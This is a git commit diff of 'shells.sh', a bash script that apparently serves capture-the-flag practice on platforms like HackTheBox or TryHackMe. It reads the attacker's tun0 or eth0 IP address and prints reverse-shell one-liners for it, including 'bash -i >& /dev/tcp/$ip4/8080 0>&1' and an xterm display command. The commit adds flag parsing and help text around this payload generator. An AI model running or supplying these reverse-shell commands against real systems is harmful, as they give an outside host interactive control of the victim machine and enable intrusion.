8a45e761b78c5422daae891e94b15c7e9de210b8
VanshDeshwal <vanshdeshwal66@gmail.com>
2020-10-10 00:52:12 -0400

    v1.2

--- shells.sh
+++ shells.sh
@@ -2,14 +2,98 @@
 
 #command to grep the tun0 ip(htb or thm virtual ip)
 
-ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
+#/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1 > "$new"
+#echo $new
 
+if [ "$2" == "-v" ]
+then
+	error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
+	# echo $error
+	if [ "$error" == "unknown" ]
+	then
+	ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
+	else
+		echo "You are not connected to any virtual network"
+		exit
+	fi
+elif [ "$2" == "-l" ] 
+then
+	ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
+
+fi
+
+#ideas
+#1. add a feature to url encode the shells
+
+	#statements
+# export ip4
+
+#echo "
+#	1.bash
+#	2.perl
+#	3.python
+#	4.php
+#	5.ruby
+#	6.nc
+#	7.java
+#	8.xterm
+#"
 #echo $ip4
+#if [ $? -eq 0 ]
+#then
+ #   echo "success"
+#else
+ #   echo "failed"
+#fi
+
+
+#testing
+# while test $# -gt 0; do
+#   case "$2" in
+#     -h|--help)
+#       echo "$package - attempt to capture frames"
+#       echo " "
+#       echo "$package [options] application [arguments]"
+#       echo " "
+#       echo "options:"
+#       echo "-h, --help                show brief help"
+#       echo "-v, --virtual     		  if you want to use your cirtual ip address"
+#       echo "-l, --local=DIR      	  if you want to use your local ip address"
+#       exit 0
+#       ;;
+#     -v|--virtual)
+#       shift
+      
+#         ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
+   
+#       shift
+#       ;;
+
+#     -l|--local)
+#       shift
+#       	ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
+#       shift
+#       ;;
+#     *)
+#       break
+#       ;;
+#   esac
+# done
+
+#######
+echo $ip4
 
 # choise selection
 if [ "$1" != "" ]
 then
-	if [ $1 == "bash" ]
+	if [ "$1" == "-h" ]
+	then
+	echo "Usage: ./shells.sh [type] -[flag]
+
+	-h                		  show help
+	-v 				  use virtual ip address
+	-l 				  use local ip address"
+	elif [ $1 == "bash" ]
 	then
 		echo "bash -i >& /dev/tcp/$ip4/8080 0>&1"
 	
@@ -43,6 +127,7 @@ then
 		echo "xterm -display $ip4:1 (default port:6001)"
 	fi
 else
-		echo "enter the type of shell you want"
+		echo "Enter the type of shell you want"
+		echo "Try './shells.sh -h' for more information."
 fi
 
